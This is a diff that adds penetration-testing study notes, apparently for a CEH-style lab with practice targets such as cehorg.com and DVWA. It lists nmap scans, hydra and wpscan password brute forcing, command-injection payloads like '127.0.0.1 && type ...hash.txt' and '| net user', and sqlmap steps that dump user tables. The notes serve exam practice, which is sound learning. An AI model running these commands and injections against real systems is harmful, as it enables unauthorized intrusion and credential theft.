@@ -1,0 +1,83 @@
+	- Wireshark
+		○ Finding the protocol used for sniffing the traffic
+			§ Open the pcap file scroll and check for duplicate ips ( Mostly the protocol will be ARP)
+	- Banner grabbing/ NGNIX version
+		○ nmap -sV --script=banner <target>
+		○ Whatweb www.website.com
+	- FTP login
+		○ Finding which server has FTP enabled
+			§ nmap -p 21 172.16.0.0/24
+			
+			nmap -p 21 10.10.10.0/24
+			
+			nmap -p 21 192.168.0.0/24
+			§ hydra -L <username.txt> -P <password.txt> ftp://172.16.0.12
+			§ Once you get the user name and password login to ftp using those credentials
+			§ Then
+				□ Ls
+				□ Mget ?
+	- ET tag / Banner grabbing 
+		○ Telnet ipaddress 80
+	- Identifying the content management system
+		○ Wig www.cehorg.com
+		○ whatweb
+	- Identifying the HTTP server used by the application
+		○ Whatweb movies.cehorg.com
+	- Web Crawling and identify the number of live png files in images folder.
+		○ Zap
+		○ Curl http://movies.cehorg.com | grep .png | wc -l
+	- Perform a bruteforce attack on www.cehorg.com and find the password of users
+		○ wpscan --url http://cehorg.com/wp-login.php -U <username.txt> -P <password.txt>
+	
+	- Finding the loadbalancing service userd
+		○ Curl -I site
+	
+	
+	
+	
+	- DVWA Finding the file with certain path hash
+		○ Decrease the security level 
+		○ Select command injection
+		○ 127.0.0.1 && type C:\wamp64\www\DVWA\hackable\uploads\hash.txt
+		○ Now copy the hash
+		○ Go to https://hashes.com/en/decrypt/hash paste and decrypt
+	- DVWA finding the users
+		○ Go to command injection
+		○ | net user
+
+
+
+SQL INJECTION using SQLMAP
+
+Step 1: Check for SQL Injection Vulnerability
+      Run this command to check if the id parameter is vulnerable:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" --dbs --batch
+      This will identify if the site is vulnerable and list the available databases.
+
+Step 2: Find the Users Table
+      Once you identify the database (e.g., moviescope), enumerate its tables:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" -D databasename --tables
+      Look for a table that might store user credentials (e.g., users, accounts, logins).
+
+Step 3: Count the Number of Users
+      If you find a table (e.g., users), count the number of entries:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" -D databasename -T tablename --count
+      This will return the number of users in the database.
+
+Step 4: Extract User Data (Ethical Considerations Apply)
+      To extract all user information:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" -D databasename -T tablename --dump
+      Only do this if you have explicit permission!
+
+If directory listing is disabled, brute-force the /images/ directory:
+
+      Using dirb
+      dirb http://movies.cehorg.com/images/ -X .png
+
+	
+		
+	
